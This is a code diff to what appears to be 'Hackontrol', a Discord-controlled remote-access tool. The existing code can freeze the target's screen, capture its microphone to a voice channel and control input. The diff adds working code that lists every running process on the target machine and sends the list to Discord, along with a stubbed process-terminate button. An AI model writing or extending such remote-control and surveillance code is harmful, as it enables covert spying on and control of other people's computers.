@@ -1,6 +1,7 @@
 package com.khopan.hackontrol.panel;
 
 import java.nio.ByteBuffer;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
@@ -11,6 +12,7 @@ import javax.sound.sampled.DataLine.Info;
 import javax.sound.sampled.TargetDataLine;
 
 import com.khopan.hackontrol.KeyboardHandler;
+import com.khopan.hackontrol.ProcessEntry;
 import com.khopan.hackontrol.nativelibrary.Kernel;
 import com.khopan.hackontrol.nativelibrary.User;
 import com.khopan.hackontrol.registry.Registration;
@@ -21,11 +23,14 @@ import com.khopan.hackontrol.service.interaction.context.Question;
 import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.LargeMessage;
+import com.khopan.hackontrol.utils.interaction.HackontrolButton;
 import com.khopan.hackontrol.utils.sendable.ISendable;
 
 import net.dv8tion.jda.api.audio.AudioSendHandler;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
+import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
@@ -52,6 +57,8 @@ public class ControlPanel extends Panel {
 	private static final Button BUTTON_SCREEN_UNFREEZE       = ButtonManager.staticButton(ButtonType.DANGER,    "Unfreeze",     "screenUnfreeze");
 
 	private static final Button BUTTON_PROCESS_LIST          = ButtonManager.staticButton(ButtonType.SUCCESS,   "Process List", "listProcess");
+	private static final Button BUTTON_PROCESS_TERMINATE     = ButtonManager.staticButton(ButtonType.DANGER,    "Terminate",    "processTerminate");
+	private static final Button BUTTON_PROCESS_REFRESH       = ButtonManager.staticButton(ButtonType.SUCCESS,   "Refresh",      "processRefresh");
 
 	private static final String MODAL_CHANGE_VOLUME          = "modalVolumeChange";
 
@@ -82,7 +89,13 @@ public class ControlPanel extends Panel {
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               context -> this.forceMode(context, false));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.freeze(context, true));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.freeze(context, false));
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_LIST,          context -> {});
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_LIST,          this :: sendProcessList);
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_TERMINATE,     context -> {});
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_REFRESH,       context -> {
+			this.sendProcessList(context);
+			HackontrolButton.deleteMessages(context);
+		});
+
 		this.register(Registration.MODAL,  ControlPanel.MODAL_CHANGE_VOLUME,          context -> {
 			String text = context.getValue("volume").getAsString();
 			int volumeLevel;
@@ -131,7 +144,7 @@ public class ControlPanel extends Panel {
 				.build(),
 				ControlWidget.newBuilder()
 				.text("**Process**")
-				.actionRow(ControlPanel.BUTTON_PROCESS_LIST)
+				.actionRow(ControlPanel.BUTTON_PROCESS_LIST, ControlPanel.BUTTON_PROCESS_TERMINATE)
 				.build()
 		};
 	}
@@ -265,6 +278,46 @@ public class ControlPanel extends Panel {
 
 		Kernel.setFreeze(KeyboardHandler.Freeze = true);
 		context.deferEdit().queue();
+	}
+
+	private void sendProcessList(IReplyCallback callback) {
+		List<ProcessEntry> processList = new ArrayList<>();
+		processList.addAll(List.of(Kernel.getProcessList()));
+		processList.sort((x, y) -> x.executableFile.compareToIgnoreCase(y.executableFile));
+		int longestIdentifierLength = 0;
+
+		for(int i = 0; i < processList.size(); i++) {
+			longestIdentifierLength = Math.max(longestIdentifierLength, Integer.toString(processList.get(i).processIdentifier).length());
+		}
+
+		longestIdentifierLength += 3;
+		int currentProcessIdentifier = Kernel.getCurrentProcessIdentifier();
+		StringBuilder builder = new StringBuilder();
+
+		for(int x = 0; x < processList.size(); x++) {
+			ProcessEntry entry = processList.get(x);
+
+			if(x > 0) {
+				builder.append('\n');
+			}
+
+			builder.append('`');
+			builder.append(entry.processIdentifier);
+
+			for(int y = 0; y < longestIdentifierLength - Integer.toString(entry.processIdentifier).length(); y++) {
+				builder.append(' ');
+			}
+
+			builder.append(entry.executableFile);
+
+			if(entry.processIdentifier == currentProcessIdentifier) {
+				builder.append(" (Current Process)");
+			}
+
+			builder.append('`');
+		}
+
+		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> request.addActionRow(ControlPanel.BUTTON_PROCESS_REFRESH, ControlPanel.BUTTON_PROCESS_TERMINATE, HackontrolButton.delete(identifiers)));
 	}
 
 	private class SendHandler implements AudioSendHandler {
